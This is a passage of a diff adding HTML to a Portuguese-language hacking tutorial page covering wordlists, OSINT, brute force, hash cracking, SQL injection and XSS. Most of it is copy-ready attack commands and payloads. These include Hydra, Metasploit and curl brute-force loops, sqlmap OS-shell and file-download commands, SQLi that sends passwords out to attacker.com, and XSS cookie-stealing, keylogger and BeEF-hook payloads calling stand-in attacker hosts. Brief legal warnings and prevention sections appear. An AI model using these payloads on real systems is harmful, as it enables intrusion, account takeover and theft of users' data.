+cd /usr/share/wordlists<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+                        </div>
+
+                        <div class="tool-card">
+                            <div class="tool-name">Gerar Wordlists Personalizadas</div>
+                            <pre class="code-block"># Com crunch (Termux: pkg install crunch)
+crunch 6 8 abcdefg123 -o wordlist.txt
+crunch 8 8 -t @@@@%%%% -o custom.txt
+
+# Com cewl (crawler para wordlist do site)
+cewl http://alvo.com -w wordlist_alvo.txt
+cewl http://alvo.com -m 6 -w wordlist.txt<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+                        </div>
+
+                        <div class="tool-card">
+                            <div class="tool-name">Combinar Wordlists</div>
+                            <pre class="code-block"># Combinar duas wordlists
+cat wordlist1.txt wordlist2.txt > combined.txt
+
+# Remover duplicatas
+sort combined.txt | uniq > final.txt
+
+# Filtrar por tamanho
+awk 'length($0) >= 8' wordlist.txt > filtered.txt<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+                        </div>
+
+                        <h2 class="mt-4"><i class="fas fa-terminal me-2"></i>Scripts Úteis</h2>
+                        <div class="tool-card">
+                            <div class="tool-name">Scanner de Subdomínios</div>
+                            <pre class="code-block">#!/bin/bash
+# subdomain_scanner.sh
+DOMAIN=$1
+WORDLIST="/usr/share/wordlists/subdomains.txt"
+
+echo "[+] Scanning subdomains for: $DOMAIN"
+for sub in $(cat $WORDLIST); do
+    host $sub.$DOMAIN 2>/dev/null | grep "has address" && echo "[+] Found: $sub.$DOMAIN"
+done<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+                        </div>
+
+                        <div class="tool-card">
+                            <div class="tool-name">Port Scanner Básico</div>
+                            <pre class="code-block">#!/bin/bash
+# port_scanner.sh
+TARGET=$1
+PORTS="21,22,23,25,53,80,110,143,443,445,3306,3389,8080"
+
+echo "[+] Scanning $TARGET"
+for port in $(echo $PORTS | tr "," " "); do
+    timeout 1 bash -c "echo >/dev/tcp/$TARGET/$port" 2>/dev/null && echo "[+] Port $port: OPEN"
+done<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+                        </div>
+
+                        <div class="tool-card">
+                            <div class="tool-name">Verificador de Headers HTTP</div>
+                            <div class="tool-description">Script para verificar headers de segurança</div>
+                            <pre class="code-block">#!/bin/bash
+# security_headers.sh
+URL=$1
+echo "[+] Checking security headers for: $URL"
+curl -sI $URL | grep -iE "(x-frame-options|x-xss-protection|x-content-type|strict-transport|content-security)"<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+                        </div>
+
+                        <h2 class="mt-4"><i class="fas fa-bolt me-2"></i>One-Liners Úteis</h2>
+                        <div class="tool-card">
+                            <div class="tool-name">Rede & Sistemas</div>
+                            <pre class="code-block"># Encontrar IP local
+ifconfig | grep "inet " | grep -v 127.0.0.1
+
+# Verificar portas abertas
+sudo netstat -tulpn
+
+# Monitorar tráfego em tempo real
+sudo tcpdump -i eth0 -n
+
+# Testar conectividade
+ping -c 4 8.8.8.8
+
+# Rastrear rota
+traceroute google.com<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+                        </div>
+
+                        <div class="tool-card">
+                            <div class="tool-name">Web & APIs</div>
+                            <pre class="code-block"># Testar SQLi básico
+curl -s "http://site.com?id=1'" | grep -i "error\|warning\|sql"
+
+# Enumerar diretórios
+for dir in $(cat wordlist.txt); do curl -s http://site.com/$dir | grep -v "404" && echo "[+] Found: $dir"; done
+
+# Testar métodos HTTP
+curl -X OPTIONS http://site.com -I
+
+# Brute force básico de login
+while read pass; do curl -s -d "user=admin&pass=$pass" http://site.com/login | grep -v "Invalid" && echo "[+] Password: $pass"; done < wordlist.txt<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+                        </div>
+
+                        <div class="d-flex justify-content-between mt-4">
+                            <button class="btn btn-outline-primary" onclick="navigateTo('home')">
+                                <i class="fas fa-arrow-left me-1"></i> Voltar
+                            </button>
+                        </div>
+                    </section>
+                </div>
+
+                <!-- SEÇÕES DE TÉCNICAS -->
+                <!-- OSINT -->
+                <div id="section-osint" class="section-hidden">
+                    <section class="content-card">
+                        <h1 class="content-title"><i class="fas fa-search me-3"></i>OSINT - Open Source Intelligence</h1>
+
+                        <div class="info-box">
+                            <i class="fas fa-info-circle fa-2x"></i>
+                            <div>
+                                <strong>OSINT</strong> é a coleta de informações de fontes públicas. É a primeira fase de qualquer teste de segurança e não requer acesso não autorizado.
+                            </div>
+                        </div>
+
+                        <h2><i class="fas fa-user me-2"></i>Coleta de Informações Pessoais</h2>
+
+                        <h3>Emails</h3>
+                        <pre class="code-block"># theHarvester para emails
+theHarvester -d dominio.com -b google,bing,linkedin
+
+# Hunter.io (via API)
+curl "https://api.hunter.io/v2/domain-search?domain=dominio.com&api_key=SUA_CHAVE"
+
+# Email formatado
+email-format.com/dominio.com<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h3>Redes Sociais</h3>
+                        <pre class="code-block"># Sherlock para username
+python3 sherlock username
+
+# SocialScan (Termux/Linux)
+socialscan username@gmail.com
+
+# WhatsMyName (repositório)
+git clone https://github.com/WebBreacher/WhatsMyName.git<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h3>Números de Telefone</h3>
+                        <pre class="code-block"># PhoneInfoga
+phoneinfoga scan -n +5511999999999
+
+# Truecaller (web)
+# https://www.truecaller.com/
+
+# Numverify (API)
+curl "http://apilayer.net/api/validate?access_key=SUA_CHAVE&number=+5511999999999"<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h2><i class="fas fa-sitemap me-2"></i>Enumeração de Infraestrutura</h2>
+
+                        <h3>Subdomínios</h3>
+                        <pre class="code-block"># Subfinder
+subfinder -d dominio.com -o subdomains.txt
+
+# Assetfinder
+assetfinder --subs-only dominio.com | tee subdomains.txt
+
+# Amass
+amass enum -d dominio.com -o subdomains.txt
+
+# Crunch data
+curl "https://crt.sh/?q=%.dominio.com&output=json" | jq -r '.[].name_value' | sort -u<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h3>DNS Information</h3>
+                        <pre class="code-block"># Dig para informações DNS
+dig dominio.com ANY
+dig dominio.com MX
+dig dominio.com TXT
+
+# Zone transfer test
+dig @ns1.dominio.com dominio.com AXFR
+
+# Reverse DNS lookup
+for ip in $(seq 1 254); do dig -x 192.168.1.$ip +short; done<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h3>Port Scanning</h3>
+                        <pre class="code-block"># Nmap para OSINT
+nmap -Pn -sS -T4 dominio.com
+
+# Shodan CLI (se tiver API key)
+shodan host dominio.com
+
+# Censys (web)
+# https://search.censys.io/<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h2><i class="fas fa-archive me-2"></i>Vazamentos de Dados</h2>
+
+                        <h3>Verificar Vazamentos</h3>
+                        <pre class="code-block"># HaveIBeenPwned (email)
+curl -s "https://haveibeenpwned.com/api/v3/breachedaccount/email@dominio.com" -H "hibp-api-key: SUA_CHAVE"
+
+# Firefox Monitor
+# https://monitor.firefox.com/
+
+# DeHashed (API)
+curl -u "user:key" "https://api.dehashed.com/search?query=email@dominio.com"<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h3>Paste Sites</h3>
+                        <pre class="code-block"># Pastebin scraping
+curl -s "https://psbdmp.ws/api/search/dominio.com" | jq
+
+# Osint.industries
+# https://osint.industries/pastes/
+
+# Pastebin com API
+# Requer conta premium<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h2><i class="fas fa-camera me-2"></i>Metadados & Imagens</h2>
+
+                        <h3>Exif Data</h3>
+                        <pre class="code-block"># ExifTool
+exiftool imagem.jpg
+
+# Strings em arquivos
+strings imagem.jpg | grep -i "gps\|camera\|model"
+
+# Online: https://exif.tools/<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h3>Reverse Image Search</h3>
+                        <pre class="code-block"># Google Images (manual)
+# https://images.google.com/
+
+# TinEye
+# https://tineye.com/
+
+# Yandex Images (eficiente)
+# https://yandex.com/images/<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <div class="success-box">
+                            <i class="fas fa-lightbulb"></i>
+                            <div>
+                                <strong>Melhores Práticas OSINT:</strong>
+                                <ul class="mb-0 mt-2">
+                                    <li>Documente todas as fontes</li>
+                                    <li>Verifique a veracidade das informações</li>
+                                    <li>Respeite a privacidade e leis locais</li>
+                                    <li>Use múltiplas fontes para confirmar dados</li>
+                                    <li>Mantenha um arquivo organizado dos achados</li>
+                                </ul>
+                            </div>
+                        </div>
+
+                        <div class="d-flex justify-content-between mt-4">
+                            <button class="btn btn-outline-primary" onclick="navigateTo('home')">
+                                <i class="fas fa-arrow-left me-1"></i> Voltar
+                            </button>
+                        </div>
+                    </section>
+                </div>
+
+                <!-- BRUTEFORCE -->
+                <div id="section-bruteforce" class="section-hidden">
+                    <section class="content-card">
+                        <h1 class="content-title"><i class="fas fa-hammer me-3"></i>Força Bruta</h1>
+
+                        <div class="info-box">
+                            <i class="fas fa-info-circle fa-2x"></i>
+                            <div>
+                                <strong>Ataques de força bruta</strong> testam combinações possíveis até encontrar a correta. Requerem wordlists de qualidade e paciência.
+                            </div>
+                        </div>
+
+                        <h2><i class="fas fa-key me-2"></i>Preparação</h2>
+
+                        <h3>Wordlists Essenciais</h3>
+                        <pre class="code-block"># Baixar wordlists comuns
+# RockYou (mais famosa)
+wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+
+# Seclists (coleção completa)
+git clone https://github.com/danielmiessler/SecLists.git
+
+# Wordlists específicas
+# - common.txt (diretórios)
+# - passwords.txt (senhas)
+# - usernames.txt (usuários)<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h3>Gerar Wordlists Personalizadas</h3>
+                        <pre class="code-block"># Crunch (padrões)
+crunch 6 8 abcdefg123 -o wordlist.txt
+crunch 8 8 -t @@@@%%%% -o custom.txt  # @=letras, %=números
+
+# Cewl (do site alvo)
+cewl http://alvo.com -w wordlist_alvo.txt
+cewl http://alvo.com -m 6 -w wordlist.txt
+
+# Combinar informações
+cat lista1.txt lista2.txt > combinada.txt
+sort combinada.txt | uniq > final.txt<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h2><i class="fas fa-plug me-2"></i>Ataques por Protocolo</h2>
+
+                        <h3>SSH Brute Force</h3>
+                        <pre class="code-block"># Com Hydra
+hydra -L usuarios.txt -P senhas.txt ssh://192.168.1.1
+
+# Com Medusa
+medusa -h 192.168.1.1 -U usuarios.txt -P senhas.txt -M ssh
+
+# Com Ncrack
+ncrack -U usuarios.txt -P senhas.txt ssh://192.168.1.1:22
+
+# Com Patator (mais opções)
+patator ssh_login host=192.168.1.1 user=FILE0 password=FILE1 0=usuarios.txt 1=senhas.txt<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h3>FTP Brute Force</h3>
+                        <pre class="code-block"># Hydra para FTP
+hydra -L usuarios.txt -P senhas.txt ftp://192.168.1.1
+
+# Com Nmap script
+nmap --script ftp-brute --script-args userdb=usuarios.txt,passdb=senhas.txt 192.168.1.1
+
+# Anonymous login primeiro
+ftp 192.168.1.1
+# Tente: anonymous / anonymous<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h3>HTTP/HTTPS Login Forms</h3>
+                        <pre class="code-block"># Hydra para POST forms
+hydra -l admin -P senhas.txt 192.168.1.1 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
+
+# Para GET forms
+hydra -l admin -P senhas.txt 192.168.1.1 http-get-form "/login.php:user=^USER^&pass=^PASS^:F=Invalid"
+
+# Com Burp Suite Intruder (GUI)
+# 1. Capturar request
+# 2. Enviar para Intruder
+# 3. Configurar payloads
+# 4. Iniciar ataque<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h3>RDP (Remote Desktop)</h3>
+                        <pre class="code-block"># Hydra para RDP
+hydra -L usuarios.txt -P senhas.txt rdp://192.168.1.1
+
+# Com Crowbar (específico para RDP)
+crowbar -b rdp -s 192.168.1.1/32 -U usuarios.txt -C senhas.txt
+
+# Ncrack também funciona
+ncrack -U usuarios.txt -P senhas.txt rdp://192.168.1.1<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h2><i class="fas fa-database me-2"></i>Database Brute Force</h2>
+
+                        <h3>MySQL</h3>
+                        <pre class="code-block"># Hydra para MySQL
+hydra -L usuarios.txt -P senhas.txt mysql://192.168.1.1
+
+# Nmap script
+nmap --script mysql-brute 192.168.1.1
+
+# Metasploit module
+msfconsole
+use auxiliary/scanner/mysql/mysql_login
+set RHOSTS 192.168.1.1
+set USER_FILE usuarios.txt
+set PASS_FILE senhas.txt
+run<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h3>PostgreSQL</h3>
+                        <pre class="code-block"># Hydra para PostgreSQL
+hydra -L usuarios.txt -P senhas.txt postgresql://192.168.1.1:5432
+
+# Metasploit
+msfconsole
+use auxiliary/scanner/postgres/postgres_login
+set RHOSTS 192.168.1.1
+set USER_FILE usuarios.txt
+set PASS_FILE senhas.txt
+run<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h2><i class="fas fa-unlock-alt me-2"></i>Cracking de Hashes</h2>
+
+                        <h3>Identificar Hashes</h3>
+                        <pre class="code-block"># hash-identifier (Kali)
+hash-identifier
+
+# hashid (Termux/Linux)
+hashid "5f4dcc3b5aa765d61d8327deb882cf99"
+
+# Online: https://hashes.com/en/tools/hash_identifier
+
+# Exemplos:
+# MD5: 32 chars hex
+# SHA1: 40 chars hex
+# SHA256: 64 chars hex
+# NTLM: 32 chars hex<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h3>John the Ripper</h3>
+                        <pre class="code-block"># Modo wordlist
+john --wordlist=rockyou.txt hashes.txt
+
+# Modo incremental
+john --incremental hashes.txt
+
+# Com rules
+john --wordlist=rockyou.txt --rules hashes.txt
+
+# Formatos específicos
+john --format=raw-md5 hashes.txt
+john --format=nt hashes.txt
+
+# Mostrar resultados
+john --show hashes.txt<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h3>Hashcat</h3>
+                        <pre class="code-block"># Identificar modo (-m)
+# MD5: -m 0
+# SHA1: -m 100
+# SHA256: -m 1400
+# NTLM: -m 1000
+# WPA2: -m 2500
+
+# Wordlist attack
+hashcat -m 0 -a 0 hashes.txt rockyou.txt
+
+# Brute force
+hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a
+
+# Combinar wordlists
+hashcat -m 0 -a 1 hashes.txt wordlist1.txt wordlist2.txt
+
+# Usar regras
+hashcat -m 0 -a 0 hashes.txt rockyou.txt -r rules/best64.rule<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <div class="warning-box">
+                            <i class="fas fa-exclamation-triangle"></i>
+                            <div>
+                                <strong>Considerações Legais:</strong>
+                                <ul class="mb-0 mt-2">
+                                    <li>Ataques de força bruta são facilmente detectáveis</li>
+                                    <li>Podem causar negação de serviço (DoS)</li>
+                                    <li>Sempre obtenha autorização por escrito</li>
+                                    <li>Use apenas em sistemas que você possui</li>
+                                    <li>Configure rate limiting para evitar bloqueios</li>
+                                </ul>
+                            </div>
+                        </div>
+
+                        <div class="d-flex justify-content-between mt-4">
+                            <button class="btn btn-outline-primary" onclick="navigateTo('home')">
+                                <i class="fas fa-arrow-left me-1"></i> Voltar
+                            </button>
+                        </div>
+                    </section>
+                </div>
+
+                <!-- SQL -->
+                <div id="section-sql" class="section-hidden">
+                    <section class="content-card">
+                        <h1 class="content-title"><i class="fas fa-database me-3"></i>SQL Injection</h1>
+
+                        <div class="info-box">
+                            <i class="fas fa-info-circle fa-2x"></i>
+                            <div>
+                                <strong>SQL Injection</strong> é uma vulnerabilidade que permite interferir nas queries SQL que uma aplicação executa. Pode levar a vazamento de dados, autenticação bypass e execução de comandos.
+                            </div>
+                        </div>
+
+                        <h2><i class="fas fa-virus me-2"></i>Tipos de SQL Injection</h2>
+
+                        <div class="tool-card">
+                            <div class="tool-name">In-Band (Classic)</div>
+                            <div class="tool-description">Mesmo canal para ataque e resultados</div>
+                            <h4>Error-Based</h4>
+                            <pre class="code-block">' OR '1'='1
+' AND 1=CONVERT(int, @@version)--
+'; SELECT @@version --<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                            <h4>Union-Based</h4>
+                            <pre class="code-block">' UNION SELECT null,version(),user()--
+' UNION SELECT 1,table_name,3 FROM information_schema.tables--<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+                        </div>
+
+                        <div class="tool-card">
+                            <div class="tool-name">Blind SQLi</div>
+                            <div class="tool-description">Respostas baseadas em true/false ou tempo</div>
+                            <h4>Boolean-Based</h4>
+                            <pre class="code-block">' AND SUBSTRING(@@version,1,1)='5'--
+' OR ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>100--<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                            <h4>Time-Based</h4>
+                            <pre class="code-block">'; IF(1=1, WAITFOR DELAY '00:00:05', '0')--
+' OR IF(SUBSTR(database(),1,1)='a',SLEEP(5),0)--<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+                        </div>
+
+                        <div class="tool-card">
+                            <div class="tool-name">Out-of-Band</div>
+                            <div class="tool-description">Usa canais alternativos (DNS, HTTP) para exfiltrar dados</div>
+                            <pre class="code-block">'; EXEC xp_dirtree '\\attacker.com\' --
+'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\test'))--<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+                        </div>
+
+                        <h2><i class="fas fa-tools me-2"></i>SQLMap Avançado</h2>
+
+                        <h3>Técnicas de Detecção</h3>
+                        <pre class="code-block"># Testar todos os parâmetros
+sqlmap -u "http://site.com/page?id=1&cat=2" --batch
+
+# Testar apenas POST
+sqlmap -u "http://site.com" --data="user=admin&pass=admin"
+
+# Testar cookies
+sqlmap -u "http://site.com" --cookie="PHPSESSID=abc123"
+
+# Testar headers personalizados
+sqlmap -u "http://site.com" --headers="X-Forwarded-For: 127.0.0.1"<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h3>Bypass WAF/Protection</h3>
+                        <pre class="code-block"># Tampers para bypass
+sqlmap -u "http://site.com" --tamper=space2comment
+sqlmap -u "http://site.com" --tamper=between,charencode
+
+# Combinar múltiplos tampers
+sqlmap -u "http://site.com" --tamper=space2comment,charencode,equaltolike
+
+# Delay entre requests
+sqlmap -u "http://site.com" --delay=2
+
+# Random user-agent
+sqlmap -u "http://site.com" --random-agent<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h3>Extração de Dados</h3>
+                        <pre class="code-block"># Listar databases
+sqlmap -u "http://site.com" --dbs
+
+# Listar tabelas
+sqlmap -u "http://site.com" -D database --tables
+
+# Listar colunas
+sqlmap -u "http://site.com" -D database -T users --columns
+
+# Dump de dados
+sqlmap -u "http://site.com" -D database -T users --dump
+
+# Dump específico
+sqlmap -u "http://site.com" -D database -T users -C username,password --dump<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h3>Execução de Comandos</h3>
+                        <pre class="code-block"># Verificar se DBA
+sqlmap -u "http://site.com" --is-dba
+
+# Shell interativo
+sqlmap -u "http://site.com" --os-shell
+
+# Command execution
+sqlmap -u "http://site.com" --os-cmd="whoami"
+
+# Upload de arquivos
+sqlmap -u "http://site.com" --file-write="/local/file" --file-dest="/remote/file"
+
+# Download de arquivos
+sqlmap -u "http://site.com" --file-download="/etc/passwd"<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h2><i class="fas fa-database me-2"></i>Bancos Específicos</h2>
+
+                        <h3>MySQL</h3>
+                        <pre class="code-block"># Informações do MySQL
+SELECT @@version, @@version_comment, user(), database();
+
+# Listar databases
+SELECT schema_name FROM information_schema.schemata;
+
+# Listar tabelas
+SELECT table_name FROM information_schema.tables WHERE table_schema=database();
+
+# Listar colunas
+SELECT column_name FROM information_schema.columns WHERE table_name='users';
+
+# Dump de dados
+SELECT * FROM users;<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h3>PostgreSQL</h3>
+                        <pre class="code-block"># Informações
+SELECT version(), current_user, current_database();
+
+# Listar databases
+SELECT datname FROM pg_database;
+
+# Listar tabelas
+SELECT tablename FROM pg_tables WHERE schemaname='public';
+
+# Listar colunas
+SELECT column_name FROM information_schema.columns WHERE table_name='users';<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h3>Microsoft SQL Server</h3>
+                        <pre class="code-block"># Informações
+SELECT @@version, system_user, db_name();
+
+# Listar databases
+SELECT name FROM master..sysdatabases;
+
+# Listar tabelas
+SELECT table_name FROM information_schema.tables;
+
+# Comandos avançados
+EXEC xp_cmdshell 'whoami';
+SELECT * FROM OPENROWSET('SQLNCLI', 'Server=attacker;Trusted_Connection=yes;', 'SELECT * FROM database..table');<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h2><i class="fas fa-shield-alt me-2"></i>Prevenção</h2>
+
+                        <h3>Melhores Práticas</h3>
+                        <div class="success-box">
+                            <i class="fas fa-check-circle"></i>
+                            <div>
+                                <strong>Como Prevenir SQL Injection:</strong>
+                                <ul class="mb-0 mt-2">
+                                    <li><strong>Use Prepared Statements/Parameterized Queries</strong></li>
+                                    <li><strong>Stored Procedures com validação</strong></li>
+                                    <li>Escape de inputs do usuário</li>
+                                    <li>Princípio do menor privilégio</li>
+                                    <li>WAF (Web Application Firewall)</li>
+                                    <li>Input validation e sanitization</li>
+                                    <li>Logging e monitoramento</li>
+                                </ul>
+                            </div>
+                        </div>
+
+                        <h3>Exemplo de Código Seguro</h3>
+                        <pre class="code-block">// PHP com PDO (Recomendado)
+$stmt = $pdo->prepare('SELECT * FROM users WHERE email = :email AND status = :status');
+$stmt->execute(['email' => $email, 'status' => $status]);
+$user = $stmt->fetch();
+
+// Python com psycopg2
+cursor.execute("SELECT * FROM users WHERE email = %s AND status = %s", (email, status))
+
+// Java com PreparedStatement
+String sql = "SELECT * FROM users WHERE email = ? AND status = ?";
+PreparedStatement pstmt = conn.prepareStatement(sql);
+pstmt.setString(1, email);
+pstmt.setString(2, status);<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <div class="d-flex justify-content-between mt-4">
+                            <button class="btn btn-outline-primary" onclick="navigateTo('home')">
+                                <i class="fas fa-arrow-left me-1"></i> Voltar
+                            </button>
+                        </div>
+                    </section>
+                </div>
+
+                <!-- XSS -->
+                <div id="section-xss" class="section-hidden">
+                    <section class="content-card">
+                        <h1 class="content-title"><i class="fas fa-code me-3"></i>XSS - Cross-Site Scripting</h1>
+
+                        <div class="info-box">
+                            <i class="fas fa-info-circle fa-2x"></i>
+                            <div>
+                                <strong>XSS</strong> permite injetar scripts maliciosos em páginas web visitadas por outros usuários. Pode roubar cookies, sessões, credenciais e executar ações em nome do usuário.
+                            </div>
+                        </div>
+
+                        <h2><i class="fas fa-biohazard me-2"></i>Tipos de XSS</h2>
+
+                        <div class="tool-card">
+                            <div class="tool-name">Reflected (Non-Persistent)</div>
+                            <div class="tool-description">O script é refletido imediatamente na resposta</div>
+                            <pre class="code-block">http://site.com/search?q=&lt;script&gt;alert(1)&lt;/script&gt;
+http://site.com/profile?name=&lt;img src=x onerror=alert(1)&gt;<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+                        </div>
+
+                        <div class="tool-card">
+                            <div class="tool-name">Stored (Persistent)</div>
+                            <div class="tool-description">Script é armazenado no servidor (comentários, perfis)</div>
+                            <pre class="code-block"># Comentário em fórum:
+&lt;script&gt;fetch('http://attacker.com/?c='+document.cookie)&lt;/script&gt;
+
+# Nome de perfil:
+&lt;img src=x onerror="stealCredentials()"&gt;<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+                        </div>
+
+                        <div class="tool-card">
+                            <div class="tool-name">DOM-Based</div>
+                            <div class="tool-description">Ocorre no lado do cliente, manipulando o DOM</div>
+                            <pre class="code-block"># URL com hash
+http://site.com#&lt;script&gt;alert(1)&lt;/script&gt;
+
+# Via document.location
+document.write(document.location.hash.substring(1))<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+                        </div>
+
+                        <h2><i class="fas fa-bomb me-2"></i>Payloads Comuns</h2>
+
+                        <h3>Alertas Básicos</h3>
+                        <pre class="code-block">&lt;script&gt;alert('XSS')&lt;/script&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;svg onload=alert(1)&gt;
+&lt;body onload=alert(1)&gt;
+&lt;iframe src="javascript:alert('XSS')"&gt;
+&lt;input type="text" value="" onfocus="alert(1)" autofocus&gt;<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h3>Steal Cookies</h3>
+                        <pre class="code-block">&lt;script&gt;document.location='http://attacker.com/?c='+document.cookie&lt;/script&gt;
+&lt;img src=x onerror="fetch('http://attacker.com/?c='+document.cookie)"&gt;
+&lt;script&gt;new Image().src='http://attacker.com/?c='+document.cookie;&lt;/script&gt;<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h3>Keylogger</h3>
+                        <pre class="code-block">&lt;script&gt;
+document.onkeypress = function(e) {
+    fetch('http://attacker.com/?k=' + e.key);
+}
+&lt;/script&gt;<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h3>BeEF Hook</h3>
+                        <pre class="code-block">&lt;script src="http://attacker:3000/hook.js"&gt;&lt;/script&gt;
+
+# Com onerror caso script seja bloqueado
+&lt;img src=x onerror="var s=document.createElement('script');s.src='http://attacker:3000/hook.js';document.body.appendChild(s);"&gt;<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h3>Port Scanning Interno</h3>
+                        <pre class="code-block">&lt;script&gt;
+for(var i=0; i&lt;65535; i++) {
+    var img = new Image();
+    img.onload = function() { fetch('http://attacker.com/?port='+this.src.split(':')[2]); };
+    img.src = "http://localhost:" + i;
+}
+&lt;/script&gt;<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h2><i class="fas fa-filter me-2"></i>Bypass de Filtros</h2>
+
+                        <h3>Case Manipulation</h3>
+                        <pre class="code-block">&lt;ScRiPt&gt;alert(1)&lt;/sCrIpT&gt;
+&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;
+&lt;script&gt;alert(1)&lt;/script&gt;<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h3>Encoding</h3>
+                        <pre class="code-block"># HTML Entities
+&lt;script&gt;alert(1)&lt;/script&gt;
+
+# Hex Encoding
+&lt;script&gt;alert(1)&lt;/script&gt;
+
+# Unicode
+&lt;script&gt;alert(1)&lt;/script&gt;<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h3>Event Handlers</h3>
+                        <pre class="code-block">&lt;img src=x onerror="alert(1)"&gt;
+&lt;img src=x OneRrOr="alert(1)"&gt;
+&lt;img src=x onerror=alert`1`&gt;
+&lt;img src=x onerror=alert.call(null,1)&gt;<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h3>JavaScript String Tricks</h3>
+                        <pre class="code-block">alert(String.fromCharCode(88,83,83))
+eval('al'+'ert(1)')
+window['al'+'ert'](1)
+top['al'+'ert'](1)
+self['al'+'ert'](1)<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h2><i class="fas fa-tools me-2"></i>Ferramentas de Teste</h2>
+
+                        <h3>XSStrike</h3>
+                        <pre class="code-block"># Scan básico
+python3 xsstrike.py -u "http://site.com?q=test"
+
+# Crawling
+python3 xsstrike.py -u "http://site.com" --crawl
+
+# Blind XSS
+python3 xsstrike.py -u "http://site.com" --blind<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h3>XSS Hunter</h3>
+                        <pre class="code-block"># Serviço online para blind XSS
+# 1. Crie conta em https://xss.hunter.io
+# 2. Use payloads como:
+&lt;script src="https://yourdomain.xss.ht"&gt;&lt;/script&gt;
+
+# 3. Receba notificações quando disparado<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h3>BeEF Framework</h3>
+                        <pre class="code-block"># Iniciar
+beef-xss
+
+# Acessar: http://127.0.0.1:3000/ui/panel
+# Credenciais padrão: beef/beef
+
+# Hook browsers com:
+&lt;script src="http://your-ip:3000/hook.js"&gt;&lt;/script&gt;<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h2><i class="fas fa-shield-alt me-2"></i>Prevenção</h2>
+
+                        <h3>Content Security Policy (CSP)</h3>
+                        <pre class="code-block"># Header CSP exemplo
+Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
+
+# Meta tag
+&lt;meta http-equiv="Content-Security-Policy" content="default-src 'self'"&gt;
+
+# Relatório de violações
+Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report;<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h3>HttpOnly Cookies</h3>
+                        <pre class="code-block"># PHP
+setcookie("session", $session_id, [
+    'httponly' => true,
+    'secure' => true,
+    'samesite' => 'Strict'
+]);
+
+# Node.js
+res.cookie('session', sessionId, {
+    httpOnly: true,
+    secure: true,
+    sameSite: 'strict'
